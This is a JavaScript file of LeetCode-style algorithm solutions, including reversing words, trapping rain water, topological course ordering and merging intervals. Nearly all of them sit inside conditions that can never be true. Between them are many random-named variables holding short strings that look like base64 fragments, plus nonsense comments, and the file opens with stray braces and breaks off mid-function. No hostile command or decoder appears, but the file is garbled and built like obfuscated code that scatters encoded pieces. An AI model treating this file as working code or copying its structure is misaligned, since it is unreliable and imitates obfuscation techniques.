For example,
Given s = "the sky is blue",
return "blue is sky the".

 * @param {string} str
 * @returns {string}
 */
var reverseWords = function(str) {
    var result = '',
        arr,
        len,
        i;
        
    if (str === null || str === '') {
        return result;
    }
    arr = str.split(' ');
    len = arr.length;
    for(i = len - 1; i >= 0; i--) {
        if (arr[i].length === 0) {
            continue;
        }
        result += ' ' + arr[i];
    }
    return result.trim();
};

}

    var ubmjpq = 'ARUomNqqMl';
if (4 instanceof String) {
    /**
Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.

For example, 
Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6.


The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!


*/

// add new solution 
/**
 * @param {number[]} height
 * @return {number}
 *
 * Search from left to right and maintain a max height of left and right separately, which is like a one-side wall of partial container. Fix the higher one and flow water from the lower part. For example, if current height of left is lower, we fill water in the left bin. Until left meets right, we filled the whole container.
 */
var trap = function(height) {
    var len = height.length,
        leftMax = 0,
        rightMax = 0,
        left = 0,
        right = len - 1,
        sum = 0;
    
    while (left <= right) {
        if (height[left] <= height[right]) {
            if (height[left] > leftMax) {
                leftMax = height[left];
            } else {
                sum += leftMax - height[left];
            }
            
            left++;
        } else {
            if (height[right] > rightMax) {
                rightMax = height[right];
            } else {
                sum += rightMax - height[right];
            }
            
            right--;
        }
    }
    
    return sum;
};


/**
 * @param {number[]} height
 * @return {number}
 */
var trap = function(height) {
    var len = height.length,
        leftMax = [],
        rightMax = [],
        max,
        sum = 0,
        i;
    
    leftMax[0] = 0;
    rightMax[len - 1] = 0;
    
    for (i = 1; i < len; i++) {
        leftMax[i] = Math.max(leftMax[i - 1], height[i - 1]);
    }
    
    for (i = len - 2; i >= 0; i--) {
        rightMax[i] = Math.max(rightMax[i + 1], height[i + 1]);
    }
    
    for (i = 1; i < len - 1; i++) {
        max = Math.min(leftMax[i], rightMax[i]);
        
        if (max - height[i] > 0) {
            sum += max - height[i];
        }
    }
    
    return sum;
};

}

    var ydjfcwahak = 'nNiM0JsY';
    var bpjnjqah = 'EvRteyAs';
if ('i' === 'P') {
    /**
Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive.

Example:
Given nums = [-2, 0, 3, -5, 2, -1]

sumRange(0, 2) -> 1
sumRange(2, 5) -> -1
sumRange(0, 5) -> -3
Note:
You may assume that the array does not change.
There are many calls to sumRange function.
*/

/**
 * @constructor
 * @param {number[]} nums
 */
var NumArray = function(nums) {
    var len = nums.length,
        i;
        
    this.sums = [];
    this.sums[0] = 0;
        
    for (i = 0; i < len; i++) {
        this.sums[i + 1] = this.sums[i] + nums[i];
    }
    
};

/**
 * @param {number} i
 * @param {number} j
 * @return {number}
 */
NumArray.prototype.sumRange = function(i, j) {
    return this.sums[j + 1] - this.sums[i];
};


/**
 * Your NumArray object will be instantiated and called as such:
 * var numArray = new NumArray(nums);
 * numArray.sumRange(0, 1);
 * numArray.sumRange(0, 2);
 */

}

    var hcmyj = '2lCMGIy';
    var zbroyjrwmlq = 'fkMJqC';
    var yucmaydysxm = 'OXNjeT';
if ('w' === 'B') {
    /**
Given an unsorted array of integers, find the length of the longest consecutive elements sequence.

For example,
Given [100, 4, 200, 1, 3, 2],
The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4.

Your algorithm should run in O(n) complexity.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var longestConsecutive = function(nums) {
    var len = nums.length,
        map = {}, // key is nums[i], value is i
        visited = [],
        maxLen = 0,
        left,
        right,
        curLen,
        i;
        
    for (i = 0; i < len; i++) {
        map[nums[i]] = i;
    }
    
    for (var val in map) {
        i = map[val];
        
        if (visited[i]) {
            continue;
        }
        
        val = parseInt(val);
        left = val - 1;
        right = val + 1;
        curLen = 1;
        
        while (map.hasOwnProperty(left)) {
            visited[map[left]] = true;
            curLen++;
            left--;
            
        }
        
        while (map.hasOwnProperty(right)) {
            visited[map[right]] = true;
            curLen++;
            right++;
        }
        
        if (curLen > maxLen) {
            maxLen = curLen;
        }
    }
    
    return maxLen;
};

}

    var dvtudmovbi = 'SYxhR';
    var mjbvjnradlmdyom = 'RLWkc5amR';
    var mlzfnazhb = 'jMFo';
    var qsehciaia = 'XMWxib';
    var lahlbjjjspk = 'uzOyL';
if (null === 3) {
    /**
Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue.

Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.

Note:
You are not suppose to use the library's sort function for this problem.

click to show follow up.

Follow up:
A rather straight forward solution is a two-pass algorithm using counting sort.
First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's.

Could you come up with an one-pass algorithm using only constant space?

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var sortColors = function(nums) {
    var len = nums.length,
        redEnds = 0,
        blueStarts = len - 1,
        i;
    
    function swap(m, n, arr) {
        var temp = arr[m];
        
        arr[m] = arr[n];
        arr[n] = temp;
    }

    for (i = 0; i <= blueStarts;) {
        if (nums[i] === 0) {
            swap(i, redEnds, nums);
            i++;
            redEnds++;
        } else if (nums[i] === 2) {
            swap(i, blueStarts, nums);
            blueStarts--;
        } else {
            i++;
        }
    }
};

}

    var zhqjcfbjcc = 'lF1WVdSa1';
    var ncjskcbvfi = 'QjQXjyBRO';
    var wevoot = 'JYWmxiblJ';
    var blamjarqyy = 'rKeqL';
    var hzpcs = 'NYVhOMFp';
    var lhebwkg = 'ZolBtBa';
    var rdcxzetxxq = 'XNWxja';
    var nkcsfm = 'oVaeFYUC';
    var syqquff = 'Wdp';
    var pfgsljvk = 'WOsp';
    var fiasfhtlbf = 'YTJWNVpH';
if (8 === 11) {
    /**
There are a total of n courses you have to take, labeled from 0 to n - 1.

Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]

Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.

There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.

For example:

2, [[1,0]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1]

4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].

Note:
The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.

click to show more hints.

Hints:
This problem is equivalent to finding the topological order in a directed graph. If a cycle exists, no topological ordering exists and therefore it will be impossible to take all courses.
Topological Sort via DFS - A great video tutorial (21 minutes) on Coursera explaining the basic concepts of Topological Sort.
Topological sort could also be done via BFS.
*/
/**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {number[]}
 */
var findOrder = function(numCourses, prerequisites) {
    var courses = [],
        prereqCounts = [],
        queue = [],
        temp,
        result = [],
        i,
        j,
        k;
        
    for (i = 0; i < numCourses; i++) {
        courses.push(new Set());
    }
    
    // [1] is [0]'s prerequisite 
    // To take course [0] you should have finished course [1]
    for (i = 0; i < prerequisites.length; i++) {
        courses[prerequisites[i][1]].add(prerequisites[i][0]);
    }
    
    for (i = 0; i < numCourses; i++) {
        prereqCounts[i] = 0;
    }
    
    // count the pre-courses
    for (i = 0; i < numCourses; i++) {
        temp = Array.from(courses[i]);
        
        for (j = 0; j < temp.length; j++) {
            prereqCounts[temp[j]]++;
        }
    }
    
    for (i = 0; i < numCourses; i++) {
        if (prereqCounts[i] === 0) {
            queue.push(i);
            prereqCounts[i] = -1;
        }
    }
    
    while (queue.length > 0) {
        j = queue.shift();
        result.push(j);
        
        temp = Array.from(courses[j]);
        
        for (i = 0; i < temp.length; i++) {
            prereqCounts[temp[i]]--;
            
            if (prereqCounts[temp[i]] === 0) {
                queue.push(temp[i]);
                prereqCounts[temp[i]] = -1;
            }
        }
    }
    
    if (result.length === numCourses) {
        return result;
    }
    
    return [];
};

}

    var qzptouuafucf = 'MaZikTkOdC';
    var ljpzehdcthd = 'OTN';
if (44 > 115) {
    /**
Given a singly linked list, determine if it is a palindrome.

Follow up:
Could you do it in O(n) time and O(1) space?
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {boolean}
 */
var isPalindrome = function(head) {
    var fast = head,
        slow = head,
        midPoint;
    
    if (head === null || head.next === null) {
        return true;
    }
    
    while (fast && fast.next) {
        fast = fast.next.next;
        slow = slow.next;
    }

    midPoint = reverse(slow);
    fast = head;
    
    while (midPoint && fast && (fast.val === midPoint.val)) {
        midPoint = midPoint.next;
        fast = fast.next;
    }

    return midPoint === null;
};

function reverse(head) {
    if (!head) {
        return null;
    }

    if (!head.next) {
        return head;
    }

    var newHead = reverse(head.next);

    head.next.next = head;
    head.next = null;

    return newHead;
}

}

    var cmkdryt = 'liUsrAuU';
    var acgfe = 'iaUlzSUda';
    var wlfmqaggxhcc = 'TTiW';
    var vgfolwpkuruian = 'MWJtTjBhV';
    var btexztxsuzd = 'bHcpbE';
    var wmqodjhamvknp = 'zl1';
    var eornuau = 'kDQLep';
if (4 instanceof String) {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var xbrmswibbbxkhe = 'S0d';
if ('a' === 'V') {
    /**
 *Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
 *
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
Reverse a linked list from position m to n. Do it in-place and in one-pass.

For example:
Given 1->2->3->4->5->NULL, m = 2 and n = 4,

return 1->4->3->2->5->NULL.

Note:
Given m, n satisfy the following condition:
1 ≤ m ≤ n ≤ length of list.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseBetween = function(head, m, n) {
    var dummy = new ListNode(0),
        newTail,
        prev,
        cur = dummy,
        next,
        i;
        
    if (m === n || head === null || head.next === null) {
        return head;
    }
    dummy.next = head;
    i = m - 1;
    
    while (i > 0) {
        cur = cur.next;
        i--;
    }
    
    prev = cur;
    cur = cur.next;
    newTail = prev.next;
    
    prev.next = null;
    i = n - m;
    
    while (cur && i >= 0) {
        next = cur.next;
        cur.next = prev.next;
        prev.next = cur;
        cur = next;
        i--;
    }
    
    newTail.next = next;
    return dummy.next;
    
};

}

    var avglpjxw = 'HWcqdaLTJ';
    var usmnjfabvq = 'WMlpXNTB';
    var fbshhr = 'lUzVM';
if (10 === 16) {
    /**
Given a binary tree, determine if it is height-balanced.

For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isBalanced = function(root) {
    return findDepth(root) === -1 ? false : true;
};

function findDepth(root) {
    if (root === null) {
        return 0;
    }
    
    var leftDepth = findDepth(root.left),
        rightDepth;
        
    if (leftDepth === -1) {
        return -1;
    }
    
    rightDepth = findDepth(root.right);
    
    if (rightDepth === -1) {
        return -1;
    }
    
    if (Math.abs(leftDepth - rightDepth) > 1) {
        return -1;
    }
    
    return Math.max(leftDepth, rightDepth) + 1;
}

}

    var pzfdhyouwwwrku = 'LU0I';
    var tzgmwsatzh = 'DUOvteZ';
if ('false' === true) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var zwxwkav = '3Q2lB';
    var lshwqwokkyl = 'ArdPEL';
if (2 === 17) {
    /**
Given two binary strings, return their sum (also a binary string).

For example,
a = "11"
b = "1"
Return "100".
*/

/**
 * @param {string} a
 * @param {string} b
 * @return {string}
 */
var addBinary = function(a, b) {
    var lenA = a.length,
        lenB = b.length,
        overFlow = 0,
        charA,
        charB,
        result = '',
        curVal,
        i,
        j;

    for (i = lenA - 1, j = lenB - 1; i >= 0 && j >= 0; i--, j --) {
        charA = parseInt(a.charAt(i));
        charB = parseInt(b.charAt(j));

        curVal = charA + charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;
    }

    while (i >= 0) {
        charA = parseInt(a.charAt(i));
        curVal = charA + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        result = curVal + result;

        i--;
    }

    while (j >= 0) {
        charB = parseInt(b.charAt(j));
        curVal = charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;

        j--;
    }

    if (overFlow === 1) {
        result = '1' + result;
    }
    
    return result;
};

}

    var xugcpjqv = 'Z0lDQnBaaU';
if (8 === 16) {
    /**
 * @param {string} s
 * @return {string}
 */
var reverseString = function(s) {
    if (!s) {
        return s;
    }
    
    return s.split('').reverse().join('');
};

}

    var rleyndrqgjc = 'eOQWMAxj';
    var xlzbsfnmbya = 'FvYVhOU';
    var iqowiulu = 'IlTLebCWVb';
    var fkyeketuj = '1pYT';
if (typeof window === 'undefined') {
    /**
Given two binary strings, return their sum (also a binary string).

For example,
a = "11"
b = "1"
Return "100".
*/

/**
 * @param {string} a
 * @param {string} b
 * @return {string}
 */
var addBinary = function(a, b) {
    var lenA = a.length,
        lenB = b.length,
        overFlow = 0,
        charA,
        charB,
        result = '',
        curVal,
        i,
        j;

    for (i = lenA - 1, j = lenB - 1; i >= 0 && j >= 0; i--, j --) {
        charA = parseInt(a.charAt(i));
        charB = parseInt(b.charAt(j));

        curVal = charA + charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;
    }

    while (i >= 0) {
        charA = parseInt(a.charAt(i));
        curVal = charA + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        result = curVal + result;

        i--;
    }

    while (j >= 0) {
        charB = parseInt(b.charAt(j));
        curVal = charB + overFlow;

        if (curVal > 1) {
            curVal = curVal - 2;
            overFlow = 1;
        } else {
            overFlow = 0;
        }
        
        result = curVal + result;

        j--;
    }

    if (overFlow === 1) {
        result = '1' + result;
    }
    
    return result;
};

}

    var oqrhouuen = 'RGZpsilc';
if (!true && 0) {
    /**
Given a string s and a dictionary of words dict, determine if s can be segmented into a space-separated sequence of one or more dictionary words.

For example, given
s = "leetcode",
dict = ["leet", "code"].

Return true because "leetcode" can be segmented as "leet code".
*/
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {boolean}
 */
var wordBreak = function(s, wordDict) {
    var hasFound = [],
        len = s.length,
        i,
        j;
    
    hasFound[0] = true;
    
    for (i = 1; i <= len; i++) {
        for (j = 0; j < i; j++) {
            if (hasFound[j] && wordDict.has(s.substring(j, i))) {
                hasFound[i] = true;
                break;
            }
        }
    }
    
    return hasFound[len] === true;
};

}

    var sogob = 'jBjbWxqZ';
    var xjcbbndo = 'cVbWBfoMHo';
if (7 instanceof String) {
    /**
The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the "root." Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that "all houses in this place forms a binary tree". It will automatically contact the police if two directly-linked houses were broken into on the same night.

Determine the maximum amount of money the thief can rob tonight without alerting the police.

Example 1:
     3
    / \
   2   3
    \   \ 
     3   1
Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.
Example 2:
     3
    / \
   4   5
  / \   \ 
 1   3   1
Maximum amount of money the thief can rob = 4 + 5 = 9.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var rob = function(root) {
    var result = dfsRob(root);
    
    return Math.max(result[0], result[1]);
};

// return an array to keep 2 values: 
// the maximum money when a root is selected and the maximum value when a root if NOT selected.
function dfsRob(root) {
    if (!root) {
        return [0, 0];
    }
    
    var left = dfsRob(root.left),
        right = dfsRob(root.right),
        includeRootVal,
        noRootVal;
    
    includeRootVal = left[1] + right[1] + root.val;
    noRootVal = Math.max(left[0], left[1]) + Math.max(right[0], right[1]);
    
    return [includeRootVal, noRootVal];
}

}

    var hrmptlhfmokgg = 'EdWa1UyaHZ';
    var hslrjj = 'IBwAfHviy';
if (10 === 17) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times) with the following restrictions:

You may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).
After you sell your stock, you cannot buy stock on next day. (ie, cooldown 1 day)
Example:

prices = [1, 2, 3, 0, 2]
maxProfit = 3
transactions = [buy, sell, cooldown, buy, sell]
*/
/**
 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var len = prices.length,
        buy = [],
        sell = [],
        i;
    
    if (len < 2) {
        return 0;
    }
    
    // buy[i] 是指在第i天手上持有股票的最大收益
    // sell[i] 是指在第i天手上没有股票的最大收益
    buy[0] = 0 - prices[0];
    buy[1] = Math.max(0 - prices[0], 0 - prices[1]);
    sell[0] = 0;
    sell[1] = Math.max(0, buy[0] + prices[1]);
    
    for (i = 2; i < len; i++) {
        buy[i] = Math.max(buy[i - 1], sell[i - 2] - prices[i]);
        sell[i] = Math.max(sell[i - 1], buy[i - 1] + prices[i]);
    }
    
    return sell[len - 1];
};

}

// code number
    var bowminbgs = 'splW';
    var wbiabehzoxnaq = 'jblJqZF';
    var lyykzkxjq = 'mVSula';
    var uojdhhaypyp = 'hRb1';
    var xllbriqvq = 'JFpm';
    var tqzojbnnemxd = 'pYWm';
if ('false' === true) {
    /**
Given n non-negative integers representing the histogram's bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.


Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].


The largest rectangle is shown in the shaded area, which has area = 10 unit.

For example,
Given heights = [2,1,5,6,2,3],
return 10.
*/
/**
 * @param {number[]} heights
 * @return {number}
 */
var largestRectangleArea = function(heights) {
    var len = heights.length,
        stack = [],
        max = 0,
        cur,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    heights[len] = 0;
    len++;
    
    for (i = 0; i < len;) {
        if (stack.length > 0 && heights[i] <= heights[stack[stack.length - 1]]) {
            cur = stack.pop();
            // 如果栈已经为空，说明到目前为止所有元素（当前下标元素除外）都比出栈元素高度要大（否则栈中肯定还有元素），所以矩阵面积就是高度乘以当前下标i。
            // 如果栈不为空，那么就是从当前栈顶元素的下一个到当前下标的元素之前都比出栈元素高度大（因为栈顶元素第一个比当前出栈元素小的）。
            max = Math.max(max, heights[cur] * (stack.length === 0 ? i : i - stack[stack.length - 1] - 1));
            continue;
        }
        
        stack.push(i);
        i++;
    }
    
    return max;
};

}

    var plkqbynace = 'CZJhsb';
if (4 instanceof String) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var maxPathSum = function(root) {
    var max = [];
    
    max[0] = Number.NEGATIVE_INFINITY;
    getMaxValueToParent(root, max);
    
    return max[0];
};

/**
* This function returns the max value that contains current node to its parent
*/
function getMaxValueToParent(root, max) {
    if (root === null) {
        return 0;
    }
    
    var left = getMaxValueToParent(root.left, max),
        right = getMaxValueToParent(root.right, max),
        maxPathAcrossRootNotToParent = root.val + left + right, // path that contains current node and will not go to its parent
        maxPathAcrossRootToParent = Math.max(root.val, root.val + Math.max(left, right));
        
    max[0] = Math.max(max[0], maxPathAcrossRootNotToParent, maxPathAcrossRootToParent);
    
    return maxPathAcrossRootToParent;
}

}

    var lhiykeqecbadkb = 'xiblFw';
    var hbfkphbhsou = 'uzaBpOqDLQ';
if (24 > 186) {
    /**
Given a range [m, n] where 0 <= m <= n <= 2147483647, return the bitwise AND of all numbers in this range, inclusive.

For example, given the range [5, 7], you should return 4.
*/

/**
 * @param {number} m
 * @param {number} n
 * @return {number}
 */
var rangeBitwiseAnd = function(m, n) {
    var offset = 0;
    
    while (m && n) {
        if (m === n) {
            return m << offset;
        }
        
        m >>= 1;
        n >>= 1;
        offset++;
    }
    
    return 0;
};

}

    var zechm = 'S1NCN0N';
    var dxwctahp = 'fbePSIM';
    var bdstbyr = 'pQWdJQ';
    var htrytggydv = 'KTnNB';
    var rbputuqwtoamqwe = '0FnSUNBZ1p';
if (null === 2) {
    /**
Reverse digits of an integer.

Example1: x = 123, return 321
Example2: x = -123, return -321

click to show spoilers.

Have you thought about this?
Here are some good questions to ask before coding. Bonus points for you if you have already thought through this!

If the integer's last digit is 0, what should the output be? ie, cases such as 10, 100.

Did you notice that the reversed integer might overflow? Assume the input is a 32-bit integer, then the reverse of 1000000003 overflows. How should you handle such cases?

For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.

Update (2014-11-10):
Test cases had been added to test the overflow behavior.
*/
/**
 * @param {number} x
 * @return {number}
 */
var reverse = function(x) {
    var isNegative = x < 0? true: false,
        divider = 10,
        result = 0,
        reminder;
    
    if (isNegative) {
        x = x * (-1);
    }
    
    while (x !== 0) {
        reminder = x % 10;
        result = result * 10 + reminder;
        
        x = Math.floor(x / 10);
    }
    
    if (result >= 2147483648) {
        return 0;
    }
    
    return isNegative? result * (-1) : result;
};

}

    var rbxhpuzms = 'Srojz';
// world export debug await hello export define
    var tzihwtqj = 'tSNtN';
if (!true && 0) {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var ersvlem = 'YWmx';
    var jvhbgzptqq = 'xzCvDNlkqN';
// import import number string array return compile
    var owzidblzmimc = 'LQiFv';
    var yahtclyisrcxl = 'iblF1Y0hKb';
    var wgqeeihcsrx = 'ALzF';
// define function constant compile constant string
    var dasmome = 'BmKvBKATfF';
if (4 instanceof String) {
    /**
Given n non-negative integers representing the histogram's bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.


Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].


The largest rectangle is shown in the shaded area, which has area = 10 unit.

For example,
Given heights = [2,1,5,6,2,3],
return 10.
*/
/**
 * @param {number[]} heights
 * @return {number}
 */
var largestRectangleArea = function(heights) {
    var len = heights.length,
        stack = [],
        max = 0,
        cur,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    heights[len] = 0;
    len++;
    
    for (i = 0; i < len;) {
        if (stack.length > 0 && heights[i] <= heights[stack[stack.length - 1]]) {
            cur = stack.pop();
            // 如果栈已经为空，说明到目前为止所有元素（当前下标元素除外）都比出栈元素高度要大（否则栈中肯定还有元素），所以矩阵面积就是高度乘以当前下标i。
            // 如果栈不为空，那么就是从当前栈顶元素的下一个到当前下标的元素之前都比出栈元素高度大（因为栈顶元素第一个比当前出栈元素小的）。
            max = Math.max(max, heights[cur] * (stack.length === 0 ? i : i - stack[stack.length - 1] - 1));
            continue;
        }
        
        stack.push(i);
        i++;
    }
    
    return max;
};

}

    var ctfuu = 'GRtVnVkRVJ';
    var wfnaxqilhb = 'BFxBRN';
    var fpwzipwhnwid = 'sWm1GMWJ';
    var oclsrnuacdt = 'tCGETgBBM';
    var cohnilfxi = 'IUW9L';
if (0.17 && false) {
    /**
Given an integer n, generate a square matrix filled with elements from 1 to n2 in spiral order.

For example,
Given n = 3,

You should return the following matrix:
[
 [ 1, 2, 3 ],
 [ 8, 9, 4 ],
 [ 7, 6, 5 ]
]
*/

/**
 * @param {number} n
 * @return {number[][]}
 */
var generateMatrix = function(n) {
    var curNum = 1,
        total = parseInt(n / 2),
        result = [],
        temp,
        level,
        i,
        j;

    if (n === 0) {
        return result;
    }

    if (n === 1) {
        temp = [1];
        result.push(temp);
        return result;
    }
    // initialization
    for (i = 0; i < n; i++) {
        temp = [];
        for (j = 0; j < n; j++) {
            temp.push(0);
        }

        result.push(temp);
    }


    for (level = 0; level < total; level++) {
        // top
        for (i = level; i < n - level - 1; i++) {
            result[level][i] = curNum;

            if (curNum === n * n) {
                return result;
            }

            curNum++;
        }

        // right
        for (i = level; i < n - level - 1; i++) {
            result[i][n - level - 1] = curNum;
            curNum++;
        }

        // bottom
        for (i = n - level - 1; i > level; i--) {
            result[n - level - 1][i] = curNum;
            curNum++;
        }

        // left
        for (i = n - level - 1; i > level; i--) {
            result[i][level] = curNum;
            curNum++;
        }
    }
    
    if (curNum === n * n) {
        result[total][total] = curNum;
    }
    
    return result;
};

}

    var yywjiiqtkvpg = 'ivgDubizj';
    var ysqoh = 'VHNLSU';
    var zyzysqc = 'EJfGdIi';
    var zgcjicucpfic = 'NBZ0lD';
    var hrceuaa = 'dDsfFo';
    var snqehdanxt = 'QWdJQ0J';
    var btqkvpspojc = 'ZALY';
if (8 === 15) {
    /**
Given a collection of intervals, merge all overlapping intervals.

For example,
Given [1,3],[2,6],[8,10],[15,18],
return [1,6],[8,10],[15,18].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {Interval[]}
 */
var merge = function(intervals) {
    var len = intervals.length,
        start = null,
        end,
        result = [],
        cur,
        i;
    
    if (len <= 1) {
        return intervals;
    }
    
    intervals.sort(function(a, b) {
        if (a.start < b.start) {
            return - 1;
        } else if (a.start > b.start) {
            return 1;
        } else {
            return a.end - b.end;
        }
    });
    
    for (i = 0; i < len; i++) {
        cur = intervals[i];
        
        if (i === 0) {
            start = cur.start;
            end = cur.end;
        } else {
            if (cur.start <= end) {
                end = Math.max(end, cur.end);
            } else {
                result.push(new Interval(start, end));
                start = cur.start;
                end = cur.end;
            }
        }
    }
    
    if (start !== null) {
        result.push(new Interval(start, end));
    }
    
    return result;
};

}

    var wqxlkyxks = '5WlhSMWNtN';
    var hhikbqwtmn = 'NlEDWuNcR';
    var wzzdd = 'GdabU';
if (0.73 && false) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

Find the minimum element.

You may assume no duplicate exists in the array.
*/

// O(N) solution
/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        i;
    
    if (len === 0) {
        return null;
    }
    
    for (i = 1; i < len; i++) {
        if (nums[i] < nums[i - 1]) {
            return nums[i];
        }
    }
    
    return nums[0];
